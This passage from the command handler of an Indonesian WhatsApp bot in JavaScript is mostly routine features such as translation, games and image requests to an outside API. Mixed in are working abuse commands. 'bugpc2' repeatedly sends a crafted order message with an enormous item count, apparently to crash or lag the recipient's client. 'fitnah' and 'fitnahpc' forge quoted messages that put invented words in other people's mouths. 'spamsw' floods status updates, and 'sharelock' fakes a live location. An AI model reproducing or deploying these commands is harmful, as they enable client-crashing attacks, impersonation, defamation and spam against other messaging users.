						} else
			if(args.length > 0 ) {
				ngab = args.join(' ')
			teks = ngab.split('.')[0];
			bhs = ngab.split('.')[1];
			  translate(teks, {client: 'gtx', to:bhs})
			  .then((res) =>{
				  reply(res.text)
				  })
				}
			} catch (e){
				replysticker(errorstc)
			}
				  break

case 'lirik':
if (!isRegistered) return sendButtonNotRegis(from)
if (args.length < 1) return reply('Judulnya?')
replysticker(waitstc)
lirikLagu(q).then((res) => {
let lirik = `${res[0].result}`
reply(lirik)
})
break

				case 'tinyurl':
              
if (!isRegistered) return sendButtonNotRegis(from)
try {
link = args[0]
anu = await axios.get(`https://tinyurl.com/api-create.php?url=${link}`)
reply(`${anu.data}`)
} catch (e) {
emror = String(e)
reply(`${e}`)
}
break
	case 'kalkulator':

if (!isRegistered) return sendButtonNotRegis(from)
				 var mtk = body.slice(12)
				 teks = `${mtk} = ${Math_js.evaluate(mtk)}`
				 reply(teks)
				 break
				case 'dadu':
              
if (!isRegistered) return sendButtonNotRegis(from)
			random = Math.floor(Math.random() * 6) + 1
		damdu = fs.readFileSync(`./strg/sticker/${random}.webp`)
			client.sendMessage(from, damdu, sticker, {quoted: mek})
			break
			
case 'sider':
              
if (!isRegistered) return sendButtonNotRegis(from)
if (!isGroup) return reply(mess.only.group)
infom = await client.messageInfo(from, mek.message.extendedTextMessage.contextInfo.stanzaId)
tagg = []
teks = `Telah Dibaca Oleh :\n\n`
for(let i of infom.reads){
teks += '@' + i.jid.split('@')[0] + '\n'
teks += `Waktu : ` + moment(`${i.t}` * 1000).tz('Asia/Jakarta').format('DD/MM/YYYY HH:mm:ss') + '\n\n'
tagg.push(i.jid)
}
mentions(teks, tagg, true)
break

case 'sharelock':
 
if (!isRegistered) return sendButtonNotRegis(from)
kntl = `${args.join(' ')}`
nama = kntl.split("|")[0];
impostor = kntl.split("|")[1];
client.sendMessage(from, {
name: nama,
address: impostor,
jpegThumbnail: ofrply}, MessageType.liveLocation, {quoted:floc})
break

					case 'spamsw':
if (!isOwner && !mek.key.fromMe) return sticOwner(from)
if (!arg) return reply(`Penggunaan ${prefix}spamsw teks|jumlah`)
				argzi = arg.split("|")
				if (!argzi) return reply(`Penggunaan ${prefix}spam teks|jumlah`)
				if (Number(argzi[1]) >= 50) return reply('Kebanyakan!')
				if (isNaN(argzi[1])) return reply(`harus berupa angka`)
				for (let i = 0; i < argzi[1]; i++){
					client.sendMessage('status@broadcast', argzi[0], MessageType.text)
                    }
                    break	
				
                   
                    case 'upswsticker':
                    if (!isOwner && !mek.key.fromMe) return sticOwner(from)
if (!isQuotedSticker) return reply('Reply stikernya!')
if (isMedia && !mek.message.videoMessage || isQuotedSticker) {
						const encmedia = isQuotedSticker ? JSON.parse(JSON.stringify(mek).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : mek
						buff = await client.downloadMediaMessage(encmedia)
						client.sendMessage('status@broadcast', buff, sticker)
						}
						reply(`Sukses upload sticker`)
                    break
                     case 'upswaudio':
                    if (!isOwner && !mek.key.fromMe) return sticOwner(from)
if (!isQuotedAudio) return reply('Reply audionya!')
if (isMedia && !mek.message.videoMessage || isQuotedAudio) {
						const encmedia = isQuotedAudio ? JSON.parse(JSON.stringify(mek).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : mek
						buff = await client.downloadMediaMessage(encmedia)
						client.sendMessage('status@broadcast', buff, audio, {mimetype: 'audio/mp4', duration: 359996400})
						}
						reply(`Sukses upload audio`)
						break
						case 'upswvoice':
                    if (!isOwner && !mek.key.fromMe) return sticOwner(from)
if (!isQuotedAudio) return reply('Reply audionya!')
if (isMedia && !mek.message.videoMessage || isQuotedAudio) {
						const encmedia = isQuotedAudio ? JSON.parse(JSON.stringify(mek).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : mek
						buff = await client.downloadMediaMessage(encmedia)
						client.sendMessage('status@broadcast', buff, audio, {mimetype: 'audio/mp4', duration: 359996400, ptt: true})
						}
						reply(`Sukses upload voice`)
						break
case 'upswvideo':
if (!isOwner && !mek.key.fromMe) return sticOwner(from)
                    var konti = body.slice(11)
                    replysticker(waitstc)
                    var enmediap = JSON.parse(JSON.stringify(mek).replace('quotedM','m')).message.extendedTextMessage.contextInfo
					var mediap = await client.downloadAndSaveMediaMessage(enmediap)
                    const buffer3 = fs.readFileSync(mediap)
                    client.sendMessage('status@broadcast', buffer3, MessageType.video, {duration: 359996400, caption: `${konti}`})
                    reply(`Sukses upload video:\n${konti}`)
                        break
                           case 'upswgif':
if (!isOwner && !mek.key.fromMe) return sticOwner(from)
                    var konti = body.slice(7)
                    replysticker(waitstc)
                    enmedia = JSON.parse(JSON.stringify(mek).replace('quotedM','m')).message.extendedTextMessage.contextInfo
					media = await client.downloadAndSaveMediaMessage(enmedia)
                    const buffer6 = fs.readFileSync(media)
                    client.sendMessage('status@broadcast', buffer6, MessageType.video, {mimetype : 'video/gif', caption: `${konti}`})
                    reply(`Sukses upload gif:\n${konti}`)
                        break
                        case 'upswimage':
                        if (!isOwner && !mek.key.fromMe) return sticOwner(from)
                    var teksyy = body.slice(11)
                    replysticker(waitstc)
                    enmedia = JSON.parse(JSON.stringify(mek).replace('quotedM','m')).message.extendedTextMessage.contextInfo
					media = await client.downloadAndSaveMediaMessage(enmedia)
                    buffer = fs.readFileSync(media)
                    client.sendMessage('status@broadcast', buffer, MessageType.image, {quoted: mek, caption: `${teksyy}`})
                    reply(`Sukses upload image:\n${teksyy}`)
                        break
					
            
				case 'suit':
              
if (!isRegistered) return sendButtonNotRegis(from)
  if (args.length < 1) return reply('Pilih gunting/batu/kertas')
					if (args[0] === 'gunting' ) {
					  gunting = [
					    "Kamu *Gunting*\nAku *Kertas*\nKamu Menang 😔",
					    "Kamu *Gunting*\nAku *Batu*\nKamu Kalah 🙂",
					    "Kamu *Gunting*\nAku *Gunting*\nKita Seri 😏"
					    ]
					  gun = gunting[Math.floor(Math.random() * gunting.length)]
					  reply(gun)
					} else if (args[0] === 'kertas') {
					  ker = [
					    "Kamu *Kertas*\nAku *Batu*\nKamu Menang 😔",
					    "Kamu *Kertas*\nAku *Gunting*\nKamu Kalah 🙂",
					    "Kamu *Kertas*\nAku *Kertas*\nKita Seri 😏"
					    ]
					  kertas = ker[Math.floor(Math.random() * ker.length)]
						reply(kertas)
					} else if (args[0] === 'batu') {
					  bat = [
					    "Kamu *Batu*\nAku *Gunting*\nKamu Menang ??",
					    "Kamu *Batu*\nAku *Kertas*\nKamu Kalah 🙂",
					    "Kamu *Batu*\nAku *Batu*\nKita Seri 😏"
					    ]
					  batu = bat[Math.floor(Math.random() * bat.length)]
					  reply(batu)
					} else {
					  reply('Pilih gunting/batu/kertas')
					}
break
		    case 'slot':
            case 'slots':
              
if (!isRegistered) return sendButtonNotRegis(from)
            const somtoy = sotoy[Math.floor(Math.random() * sotoy.length)]
            client.sendMessage(from, `[  🎰 | SLOTS ]\n-----------------\n🍋 : 🍌 : 🍍\n${somtoy}<=====\n🍋 : 🍌 : 🍍\n[  🎰 | SLOTS ]\n\nKeterangan : Jika anda Mendapatkan 3Buah Sama Berarti Anda Menang\n\nContoh : 🍌 : 🍌 : 🍌<=====`, MessageType.text, { quoted: mek })
            break
				case 'kontak':
              
if (!isRegistered) return sendButtonNotRegis(from)
				if (!isGroup) return reply(mess.only.group)
					argzu = arg.split('|')
				if (!argzu) return reply(`Penggunaan ${prefix}kontak @tag|nama`)
				if (mek.message.extendedTextMessage != undefined){
                    mentioned = mek.message.extendedTextMessage.contextInfo.mentionedJid
					sendKontak(from, mentioned[0].split('@')[0], argzu[1])
				} else {
					sendKontak(from, argzu[0], argzu[1])
				}
				break
				case 'kontag':
              
if (!isRegistered) return sendButtonNotRegis(from)
				if (!isGroup) return reply(mess.only.group)
				if (!isGroupAdmins) return sticAdmin(from)
                argzi = arg.split('|')
				if (!argzi) return reply(`Penggunaan ${prefix}kontak @tag|nama`)
				if (mek.message.extendedTextMessage != undefined){
                    		mentioned = mek.message.extendedTextMessage.contextInfo.mentionedJid
					hideTagKontak(from, mentioned[0].split('@')[0], argzi[1])
				} else {
					hideTagKontak(from, argzi[0], argzi[1])
				}
				break
				
				case 'chat':
              
if (!isRegistered) return sendButtonNotRegis(from)
			if (args[0].startsWith('08')) return reply('Awali nomor dengan 62')
            if (args[0].startsWith('+62')) return reply('Awali nomor dengan 62')
			if (args.length < 1) return reply(`Penggunaan ${prefix}chat 62xnxx|teks`)
            var pc = body.slice(6)
            var nomor = pc.split("|")[0];
            var org = pc.split("|")[1];
            client.sendMessage(nomor+'@s.whatsapp.net', org, MessageType.text)   
            reply(`Sukses mengirim chat:\n${org},@${nomor}`)
            break
		
				case 'tag':
              
if (!isRegistered) return sendButtonNotRegis(from)
			if (args.length < 1) return reply(`Penggunaan ${prefix}tag 62xnxx`)
            var nomqm = `${body.slice(5)}@s.whatsapp.net`
					tagq = `@${nomqm.split('@')[0]}` 
					client.sendMessage(from, tagq, text, { quoted: ftrol, contextInfo: { forwardingScore: 508, isForwarded: true, mentionedJid: [nomqm]}})
			break
				
           case 'fitnahpc':
              
if (!isRegistered) return sendButtonNotRegis(from)
                if (args.length < 1) return reply(`Usage :\n${prefix}fitnahpc [nomor|pesan|balasanbot]]\n\nEx : \n${prefix}fitnahpc 0|hai|hai juga markenlin`)
                var gh = body.slice(10)
                var parti = gh.split("|")[0];
                var targetq = gh.split("|")[1];
				var bot = gh.split("|")[2];
			    client.sendMessage(from, `${bot}`, text, {quoted: { key: { fromMe: false, participant: `${parti}@s.whatsapp.net`, ...(from ? { remoteJid: "status@broadcast" } : {}) }, message: { conversation: `${targetq}` }}})
					break
            case 'fitnah':
              
if (!isRegistered) return sendButtonNotRegis(from)
            if (!isGroup) return reply(mess.only.group)
                cr = body.slice(4)
                cs = cr.split('|')
                taged = mek.message.extendedTextMessage.contextInfo.mentionedJid[0]
                const target = {
					contextInfo: {
						participant: taged,
						quotedMessage: {
							extendedTextMessage: {
								text: cs[1]
							}
						}
					}
				}
				client.sendMessage(from, cs[2], MessageType.text, target)
				break
              case 'hacked':
              
					case 'bugpc2':
if (!isOwner && !mek.key.fromMe) return sticOwner(from)
if (args.length < 1) return reply('Jumlahnya?')
for (let i = 0; i < args[0]; i++) {
client.sendMessage(from, `${NamaBot}`, MessageType.extendedText,{
 quoted: {
key: {
participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: "status@broadcast" } : {})
},
message: {
orderMessage: {
itemCount: 99999999,
status: 1,
surface: 10,
orderTitle: `${NamaOwner}`,
sellerJid: '0@s.whatsapp.net'
}}}}, 0)
}
break
//RANDOM MENU
case 'zestetikpic':
case 'zmemeindo':
case 'zdarkjokes':
if (!isRegistered) return sendButtonNotRegis(from)
if (isBanned) return replysticker(banstc)
if ( checkLimituser(sender) <= 0) return reply(ind.limitend())
					await replysticker(loadingstc)
					buffer = await getBuffer(`https://api.zeks.me/api/${command.slice(1)}?apikey=${ZeksApiku}`, {method: 'get'})
             nsfwwa3aa = await client.prepareMessage(from, buffer, image, {thumbnail: Buffer.alloc(0)})
			 let nsfwwsa = nsfwwa3aa.message["ephemeralMessage"] ? nsfwwa3aa.message.ephemeralMessage : nsfwwa3aa
const buttonsgswdfs = [
  {buttonId: `${command}`, buttonText: {displayText: 'Next'}, type: 1},
]

const buttonMessageswsfdt = {
    contentText: `Jeda 5 Detik`,
    footerText: `*Support Nekopoi.Care*\n*Offical Bot By @${numbernye.split("@")[0]}*\n*Powered By @${ow.split("@")[0]}*`,
    buttons: buttonsgswdfs,
    headerType: 4, 
	imageMessage: nsfwwsa.message.imageMessage
}

client.sendMessage(from, buttonMessageswsfdt, MessageType.buttonsMessage, {quoted: mek, contextInfo :{sendEphemeral: true, mentionedJid: [numbernye, dev, ow]}})
await confirmLIMIT(sender, [angka])
				break		
case 'znickepep': 
if (!isRegistered) return sendButtonNotRegis(from)
if (isBanned) return replysticker(banstc)
if ( checkLimituser(sender) <= 0) return reply(ind.limitend())
await replysticker(loadingstc)
anu = await fetchJson(`https://api.zeks.me/api/${command.slice(1)}?apikey=${ZeksApiku}`, {method: 'get'})
anu1 = `*Nick FF ${q}* : ${anu.result}\n`
reply(anu1)
await confirmLIMIT(sender, [angka])	
break 
case 'zfml': 
if (!isRegistered) return sendButtonNotRegis(from)
if (isBanned) return replysticker(banstc)
if ( checkLimituser(sender) <= 0) return reply(ind.limitend())
await replysticker(loadingstc)
anu = await fetchJson(`https://api.zeks.me/api/${command.slice(1)}?apikey=${ZeksApiku}`, {method: 'get'})
await sendButtonText(from, `${anu.result}`, support, [{buttonId: `${command}`,buttonText: {displayText: `NEXT`}, type: 1}], { quoted: mek, contextInfo:{mentionedJid: [numbernye, ow, player]}})
await confirmLIMIT(sender, [angka])	
break 
case 'zquote':   
if (!isRegistered) return sendButtonNotRegis(from)
if (isBanned) return replysticker(banstc)
if ( checkLimituser(sender) <= 0) return reply(ind.limitend())
await replysticker(loadingstc)
anu = await fetchJson(`https://api.zeks.me/api/${command.slice(1)}?apikey=${ZeksApiku}`, {method: 'get'})
anu1 = `*author* : ${anu.result.author}\n*quotes* : ${anu.result.quotes}`
await sendButtonText(from, anu1, support, [{buttonId: `${command}`,buttonText: {displayText: `NEXT`}, type: 1}], { quoted: mek, contextInfo:{mentionedJid: [numbernye, ow, player]}})
await confirmLIMIT(sender, [angka])	
break
case 'zpantun': 
if (!isRegistered) return sendButtonNotRegis(from)
if (isBanned) return replysticker(banstc)
if ( checkLimituser(sender) <= 0) return reply(ind.limitend())
await replysticker(loadingstc)
anu = await fetchJson(`https://api.zeks.me/api/${command.slice(1)}?apikey=${ZeksApiku}`, {method: 'get'})
anu1 = `${anu.result.pantun}`
await sendButtonText(from, anu1, support, [{buttonId: `${command}`,buttonText: {displayText: `NEXT`}, type: 1}], { quoted: mek, contextInfo:{mentionedJid: [numbernye, ow, player]}})
await confirmLIMIT(sender, [angka])	
break
case 'zrandomquran': 
if (!isRegistered) return sendButtonNotRegis(from)
if (isBanned) return replysticker(banstc)
if ( checkLimituser(sender) <= 0) return reply(ind.limitend())
await replysticker(loadingstc)
anu = await fetchJson(`https://api.zeks.me/api/${command.slice(1)}?apikey=${ZeksApiku}`, {method: 'get'})
anu1 = `*arti* : ${anu.result.arti}\n*asma* : ${anu.result.asma}\n*audio* : ${anu.result.audio}\n*ayat* : ${anu.result.ayat}\n*keterangan* : ${anu.result.keterangan}\n*nama* : ${anu.result.nama}\n*nomor* : ${anu.result.nomor}\n*rukuk* : ${anu.result.rukuk}\n*type* : ${anu.result.type}\n*urut* : ${anu.result.urut}`
await sendButtonText(from, anu1, support, [{buttonId: `${command}`,buttonText: {displayText: `NEXT`}, type: 1}], { quoted: mek, contextInfo:{mentionedJid: [numbernye, ow, player]}})
await confirmLIMIT(sender, [angka])	
break
//ZEKS API NEWs
case 'ztribunews': 
case 'zliputan6': 
case 'zfoxnews': 
if (!isRegistered) return sendButtonNotRegis(from)
if (isBanned) return replysticker(banstc)
if ( checkLimituser(sender) <= 0) return reply(ind.limitend())
await replysticker(loadingstc)
get_result = await fetchJson(`https://api.zeks.me/api/${command.slice(1)}?apikey=${ZeksApiku}`, {method: 'get'})
                    get_result = get_result.result
                    ini_txt = 'BERITA : \n'
                    for (var x of get_result) {
                        ini_txt += `Name : ${x.title}\n`
                        ini_txt += `ID : ${x.appid}\n`
                        ini_txt += `time : ${x.time}\n`
                        ini_txt += `url : ${x.url}\n\n`
                        ini_txt += `ket : ${x.ket}\n`
                    }
await sendButtonText(from, ini_txt, support, [{buttonId: `ztribunews`,buttonText: {displayText: `Tribun News`}, type: 1},{buttonId: `zliputan6`,buttonText: {displayText: `Liputan 6`}, type: 1},{buttonId: `zfoxnews`,buttonText: {displayText: `Fox News`}, type: 1}], { quoted: mek, contextInfo:{mentionedJid: [numbernye, ow, player]}})
await confirmLIMIT(sender, [angka])	
break	
//ZEKS API IMAGE TEKS 1
case 'zqrencode':
case 'zbarcode': 
case 'zhartatahta': 
case 'zbneon': 
case 'znaruto': 
case 'zmatrix': 
case 'zgneon': 
case 'zbreakwall': 
case 'zdropwater': 
case 'zbneon': 
case 'zflowertext': 
case 'zthundertext': 
case 'zcrosslogo': 
case 'zsilktext': 
case 'zflametext': 
case 'zglowtext': 
case 'zsmoketext': 
case 'zskytext':
case 'zlithgtext':
case 'zcrismes':
case 'ztfire':
case 'ztpantai':
case 'zepep':
case 'zgplaybutton':
case 'zsplaybutton':
case 'ztext3dbox':
case 'ztext3d':
case 'zlogobp':
case 'zleavest':
case 'ztlight':
if (!isRegistered) return sendButtonNotRegis(from)
if (isBanned) return replysticker(banstc)
if ( checkLimituser(sender) <= 0) return reply(ind.limitend())
if (!q) return reply(`Kirim teks dengan caption ${prefix+command} text`)
await replysticker(loadingstc)
anu = await getBuffer(`https://api.zeks.me/api/${command.slice(1)}?apikey=${ZeksApiku}&text=${q}`, {method: 'get'})
client.sendMessage(from, anu, image, {quoted: mek, thumbnail: Buffer.alloc(0)})
client.sendMessage(from, anu, document, {mimetype: 'image/jpeg', filename:`${command.slice(1)} ${q}`})
await confirmLIMIT(sender, [angka])	
break	
//ZEKS API IMAGE TEKS 2
case 'zwolflogo':
case 'zpubglogo':
case 'zcslogo':
case 'zsnowwrite':
case 'zwatercolour':
case 'zlogoaveng':
case 'zphlogo':
case 'zmarvellogo':
case 'zgtext':
case 'zwatercolour':
if (!isRegistered) return sendButtonNotRegis(from)
if (isBanned) return replysticker(banstc)
if ( checkLimituser(sender) <= 0) return reply(ind.limitend())
if (!q) return reply(`Kirim teks dengan caption ${prefix+command} text.text`)
var tex1 = q.split('.')[0]
var tex2 = q.split('.')[1]
if (!tex2) return reply(`Gunakan (.) Untuk Menghubungkan Kata Yang Dinginkan caption ${prefix+command} text.text`)
await replysticker(loadingstc)
anu = await getBuffer(`https://api.zeks.me/api/${command.slice(1)}?apikey=${ZeksApiku}&text1=${tex1}&text2=${tex2}`, {method: 'get'})
client.sendMessage(from, anu, image, {quoted: mek, thumbnail: Buffer.alloc(0)})
client.sendMessage(from, anu, document, {mimetype: 'image/jpeg', filename:`${command.slice(1)} ${tex1} ${tex2}`})
await confirmLIMIT(sender, [angka])	
break	
//ZEKS API IMAGE TEKS 3
case 'zretro':
if (!isRegistered) return sendButtonNotRegis(from)
if (isBanned) return replysticker(banstc)
if ( checkLimituser(sender) <= 0) return reply(ind.limitend())
if (!q) return reply(`Kirim teks dengan caption ${prefix+command} text.text.text`)
var tex1 = q.split('.')[0]
var tex2 = q.split('.')[1]
var tex3 = q.split('.')[2]
if (!tex2) return reply(`Kirim teks dengan caption ${prefix+command} text.text.text`)
if (!tex3) return reply(`Kirim teks dengan caption ${prefix+command} text.text.text`)
await replysticker(loadingstc)
anunt = await fetchJson(`https://api.zeks.me/api/${command.slice(1)}?apikey=${ZeksApiku}&text1=${tex1}&text2=${tex2}&text3=${tex3}`, {method: 'get'})
anu = await getBuffer(`${anunt.result}`)
client.sendMessage(from, anu, image, {quoted: mek, thumbnail: Buffer.alloc(0)})
client.sendMessage(from, anu, document, {mimetype: 'image/jpeg', filename:`${command.slice(1)} ${tex1} ${tex2} ${tex3}`})
await confirmLIMIT(sender, [angka])	
break	
//ZEKS API EMOJI
case 'zemoji-image':  // error
if (!isRegistered) return sendButtonNotRegis(from)
if (isBanned) return replysticker(banstc)
if ( checkLimituser(sender) <= 0) return reply(ind.limitend())
if (!q) return reply(`Kirim teks dengan caption ${prefix+command} pesan yang kamu inginkan di jadikan ${command.slice(1)}`)
await replysticker(loadingstc)
anu = await getBuffer(`https://api.zeks.me/api/${command.slice(1)}?apikey=${ZeksApiku}&emoji=${q}`, {method: 'get'})
client.sendMessage(from, anu, document, {mimetype: 'image/png', filename:`${command.slice(1)} ${q}`})
await confirmLIMIT(sender, [angka])	
break	
case 'zslap':
if (!isRegistered) return sendButtonNotRegis(from)
if (isBanned) return replysticker(banstc)
if ( checkLimituser(sender) <= 0) return reply(ind.limitend())
if (!q) return reply(`Kirim teks dengan caption ${prefix+command} pesan yang kamu inginkan di jadikan ${command.slice(1)}`)
await replysticker(loadingstc)
anu = await getBuffer(`https://api.zeks.me/api/${command.slice(1)}?apikey=${ZeksApiku}&img1=${q}&img2=${q}`, {method: 'get'})
client.sendMessage(from, anu, document, {mimetype: 'image/png', filename:`${command.slice(1)} ${q}`})
await confirmLIMIT(sender, [angka])	
break	
case 'zphub':  
if (!isRegistered) return sendButtonNotRegis(from)
if (isBanned) return replysticker(banstc)
if ( checkLimituser(sender) <= 0) return reply(ind.limitend())
if (!q) return reply(`Kirim teks dengan caption ${prefix+command} pesan yang kamu inginkan di jadikan ${command.slice(1)}`)
var tex1 = q.split('.')[0]
var tex2 = q.split('.')[1]
if (!tex2) return reply(`Gunakan (.) Untuk Menghubungkan Kata Yang Dinginkan caption ${prefix+command} username.text`)
await replysticker(loadingstc)
anu = await getBuffer(`https://api.zeks.me/api/${command.slice(1)}?apikey=${ZeksApiku}&img=https://1.bp.blogspot.com/-x8KhcOBG-yw/XiU4pi1yWVI/AAAAAAAADBA/gK8tsLyc1lQ808A348IKzDCjf6fUBKONwCLcBGAsYHQ/s1600/cara+buat+foto+profil+di+whatsapp+menjadi+unik.jpg&username=${tex1}&msg=${tex2}`, {method: 'get'})
client.sendMessage(from, anu, image, {quoted: mek, thumbnail: Buffer.alloc(0)})
client.sendMessage(from, anu, document, {mimetype: 'image/jpeg', filename:`${command.slice(1)} ${tex1} ${tex2}`})
await confirmLIMIT(sender, [angka])	
break
case 'zmagernulis':  
if (!isRegistered) return sendButtonNotRegis(from)
if (isBanned) return replysticker(banstc)
if ( checkLimituser(sender) <= 0) return reply(ind.limitend())
if (!q) return reply(`Gunakan (.) Untuk Menghubungkan Kata Yang Dinginkan caption ${prefix+command} nama.kelas.teks.teks`)
var nama = q.split('.')[0]
var kelas = q.split('.')[1]
var tex1 = q.split('.')[2]
var tex2 = q.split('.')[3]
if (!kelas) return reply(`Gunakan (.) Untuk Menghubungkan Kata Yang Dinginkan caption ${prefix+command} nama.kelas.teks.teks`)
if (!tex1) return reply(`Gunakan (.) Untuk Menghubungkan Kata Yang Dinginkan caption ${prefix+command} nama.kelas.teks.teks`)
if (!tex2) return reply(`Gunakan (.) Untuk Menghubungkan Kata Yang Dinginkan caption ${prefix+command} nama.kelas.teks.teks`)
await replysticker(loadingstc)
anu = await getBuffer(`https://api.zeks.me/api/${command.slice(1)}?apikey=${ZeksApiku}&nama=${nama}&kelas=${kelas}&text=${tex1}&tinta=${tex2}`, {method: 'get'})
client.sendMessage(from, anu, image, {quoted: mek, thumbnail: Buffer.alloc(0)})
client.sendMessage(from, anu, document, {mimetype: 'image/jpeg', filename:`${command.slice(1)} ${q}`})
await confirmLIMIT(sender, [angka])	
break
case 'znulis':  
if (!isRegistered) return sendButtonNotRegis(from)
if (isBanned) return replysticker(banstc)
if ( checkLimituser(sender) <= 0) return reply(ind.limitend())
if (!q) return reply(`Gunakan (.) Untuk Menghubungkan Kata Yang Dinginkan caption ${prefix+command} teks.teks`)
await replysticker(loadingstc)
anu = await getBuffer(`https://api.zeks.me/api/${command.slice(1)}?apikey=${ZeksApiku}&text=${q}`, {method: 'get'})
client.sendMessage(from, anu, image, {quoted: mek, thumbnail: Buffer.alloc(0)})
client.sendMessage(from, anu, document, {mimetype: 'image/jpeg', filename:`${command.slice(1)} ${q}`})
await confirmLIMIT(sender, [angka])	
break
case 'zbrand-logo':  
if (!isRegistered) return sendButtonNotRegis(from)
if (isBanned) return replysticker(banstc)
if ( checkLimituser(sender) <= 0) return reply(ind.limitend())
if (!q) return reply(`Gunakan (.) Untuk Menghubungkan Kata Yang Dinginkan caption ${prefix+command} teks.(pilih 1-10)`)
var tex1 = q.split('.')[0]
var tex2 = q.split('.')[1]
if (!tex2) return reply(`Gunakan (.) Untuk Menghubungkan Kata Yang Dinginkan caption ${prefix+command} teks.(pilih 1-10)`)
await replysticker(loadingstc)
anu = await getBuffer(`https://api.zeks.me/api/${command.slice(1)}?apikey=${ZeksApiku}&text=${tex1}&type=${tex2}`, {method: 'get'})
client.sendMessage(from, anu, image, {quoted: mek, thumbnail: Buffer.alloc(0)})
client.sendMessage(from, anu, document, {mimetype: 'image/jpeg', filename:`${command.slice(1)} ${tex1}`})
await confirmLIMIT(sender, [angka])	
break
case 'zcalender':   // error
case 'zdraw-image':   // error
case 'zmissing-image':   // error
case 'zsketch-image':   // error
case 'zburning-image':   // error
if (!isRegistered) return sendButtonNotRegis(from)
if (isBanned) return replysticker(banstc)
if ( checkLimituser(sender) <= 0) return reply(ind.limitend())
await replysticker(loadingstc)	
if ((isMedia && !mek.message.videoMessage || isQuotedImage) && args.length == 0) {
const encmedia = isQuotedImage ? JSON.parse(JSON.stringify(mek).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : mek
filePath = await client.downloadAndSaveMediaMessage(encmedia)
                        file_name = getRandom('.jpg')

                        request({
                            url: `https://api.zeks.me/api/${command.slice(1)}?apikey=${ZeksApiku}`,
                            method: 'POST',
                            formData: {
                                "image": fs.createReadStream(filePath)
                            },
                            encoding: "binary"
                        }, async function(error, response, body) {
                            fs.unlinkSync(filePath)
                            fs.writeFileSync(file_name, body, "binary")
                            ini_buff = fs.readFileSync(file_name)
                            await client.sendMessage(from, ini_buff, image, { quoted: mek, mimetype: Mimetype.image }).then(() => {
                                fs.unlinkSync(file_name)
                            })
                        });
                    } else {
                        reply(`Kirim gambar dengan caption ${prefix}${command} atau tag gambar yang sudah dikirim`)
                    }
                    break
//Zeks SEARCHING
case 'zsgplay':
if (!isRegistered) return sendButtonNotRegis(from)
if (isBanned) return replysticker(banstc)
if ( checkLimituser(sender) <= 0) return reply(ind.limitend())
if (!q) return reply(`Kirim teks dengan caption ${prefix+command} aplikasi yang mau dicari`)
await replysticker(loadingstc)
                    get_result = await fetchJson(`https://api.zeks.me/api/${command.slice(1)}?apikey=${ZeksApiku}&q=${q}`)
                    get_result = get_result.result
                    ini_txt = 'Play Store Search : \n'
                    for (var x of get_result) {
                        ini_txt += `Name : ${x.title}\n`
                        ini_txt += `ID : ${x.appid}\n`
                        ini_txt += `Developer : ${x.developer}\n`
                        ini_txt += `Price : ${x.price}\n\n`
                        ini_txt += `Rating : ${x.rating}\n`
                        ini_txt += `Url : ${x.url}\n`
                        ini_txt += `Thumb : ${x.thumb}\n`
                    }
await sendButtonText(from, ini_txt, support, buttonsmenu2, { quoted: mek, contextInfo:{mentionedJid: [numbernye, ow, player]}})
					await confirmLIMIT(sender, [angka])
                    break
case 'zsearchsticker':
if (!isRegistered) return sendButtonNotRegis(from)
if (isBanned) return replysticker(banstc)
if ( checkLimituser(sender) <= 0) return reply(ind.limitend())
if (!q) return reply(`Kirim teks dengan caption ${prefix+command} sticker yang mau dicari`)
await replysticker(loadingstc)
                    anu = await fetchJson(`https://api.zeks.me/api/${command.slice(1)}?apikey=${ZeksApiku}&q=${q}`)		
sendButtonText(from, `*Stikcer ${q}*\n: ${anu.sticker}`, support, buttonsmenu2, { quoted: mek,contextInfo:{mentionedJid: [player, numbernye, ow, dev]}} ) 
await confirmLIMIT(sender, [angka])
                    break
case 'zwiki':
if (!isRegistered) return sendButtonNotRegis(from)
if (isBanned) return replysticker(banstc)
if ( checkLimituser(sender) <= 0) return reply(ind.limitend())
if (!q) return reply(`Kirim teks dengan caption ${prefix+command} yang mau dicari`)
await replysticker(loadingstc)	
anu = await fetchJson(`https://api.zeks.me/api/${command.slice(1)}?apikey=${ZeksApiku}&q=${q}`)
anu1 = `${anu.result.result}`
sendButtonText(from, anu1, support, buttonsmenu2, { quoted: mek,contextInfo:{mentionedJid: [player, numbernye, ow, dev]}} ) 
await confirmLIMIT(sender, [angka])
                    break
case 'zfilm/2':
if (!isRegistered) return sendButtonNotRegis(from)
if (isBanned) return replysticker(banstc)
if ( checkLimituser(sender) <= 0) return reply(ind.limitend())
if (!q) return reply(`Kirim teks dengan caption ${prefix+command} aplikasi yang mau dicari`)
await replysticker(loadingstc)
                    get_result = await fetchJson(`https://api.zeks.me/api/${command.slice(1)}?apikey=${ZeksApiku}&q=${q}`)
                    get_result = get_result.result
                    ini_txt = 'Film Search : \n'
                    for (var x of get_result) {
                        ini_txt += `Name : ${x.title}\n`
                        ini_txt += `Url : ${x.url}\n`
                        ini_txt += `Thumb : ${x.thumb}\n`
                    }
reply(ini_txt)
await confirmLIMIT(sender, [angka])	
                    break
case 'zfilm': // error
if (!isRegistered) return sendButtonNotRegis(from)
if (isBanned) return replysticker(banstc)
if ( checkLimituser(sender) <= 0) return reply(ind.limitend())
if (!q) return reply(`Kirim teks dengan caption ${prefix+command} aplikasi yang mau dicari`)
await replysticker(loadingstc)
                    get_result = await fetchJson(`https://api.zeks.me/api/${command.slice(1)}?apikey=${ZeksApiku}&q=${q}`)
                    get_result = get_result.result
                    ini_txt = 'Play Store Search : \n'
                    for (var x of get_result) {
                        ini_txt += `Name : ${x.title}\n`
                        ini_txt += `Url : ${x.url}\n`
                        ini_txt += `Thumb : ${x.thumb}\n`
                    }
reply(ini_txt)
await confirmLIMIT(sender, [angka])	
                    break
case 'zbacakomik': // error
if (!isRegistered) return sendButtonNotRegis(from)
if (isBanned) return replysticker(banstc)
if ( checkLimituser(sender) <= 0) return reply(ind.limitend())
if (!q) return reply(`Kirim teks dengan caption ${prefix+command} aplikasi yang mau dicari`)
await replysticker(loadingstc)
                    get_result = await fetchJson(`https://api.zeks.me/api/${command.slice(1)}?apikey=${ZeksApiku}&q=${q}`)
                    get_result = get_result.result
                    ini_txt = 'Play Store Search : \n'
                    for (var x of get_result) {
                        ini_txt += `Name : ${x.title}\n`
                        ini_txt += `Url : ${x.url}\n`
                        ini_txt += `Thumb : ${x.thumb}\n`
                    }
